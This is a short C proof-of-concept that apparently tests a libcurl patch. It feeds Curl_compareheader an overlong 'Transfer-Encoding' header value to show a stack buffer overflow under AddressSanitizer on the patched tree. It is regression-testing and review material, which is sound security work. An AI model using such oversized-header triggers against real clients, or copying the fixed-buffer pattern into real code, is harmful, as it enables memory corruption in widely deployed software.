/*
 * PoC for a memory-safety defect reachable through libcurl's HTTP response
 * header matching (lib/http.c:Curl_compareheader), the same code path that
 * runs when a server sends e.g. "Transfer-Encoding:" in its response.
 *
 * A malicious/compromised server controls the header value in full. Here we
 * feed an ordinary, well-formed header line whose value is a single long
 * token (perfectly in-contract: RFC 7230 places no such small bound on a
 * field value). Curl_compareheader copies the value into a fixed stack
 * buffer before scanning it, so a long value overflows that buffer.
 *
 * On the patched tree this aborts under AddressSanitizer
 * (stack-buffer-overflow). On the parent tree the function scans the value in
 * place and simply returns FALSE, so nothing fires.
 */
#include <stdbool.h>
#include <stddef.h>
#include <string.h>
#include <stdio.h>

extern bool Curl_compareheader(const char *headerline,
                               const char *header,
                               const size_t hlen,
                               const char *content,
                               const size_t clen);

int main(void)
{
  char line[512];
  const char *header = "Transfer-Encoding:";
  const char *content = "chunked";
  size_t i, n;

  /* "Transfer-Encoding: " followed by a 200-byte token value */
  n = (size_t)snprintf(line, sizeof(line), "%s ", header);
  for(i = 0; i < 200; i++)
    line[n + i] = 'a';
  line[n + 200] = '\0';

  bool r = Curl_compareheader(line, header, strlen(header),
                              content, strlen(content));
  printf("result=%s\n", r ? "TRUE" : "FALSE");
  return 0;
}
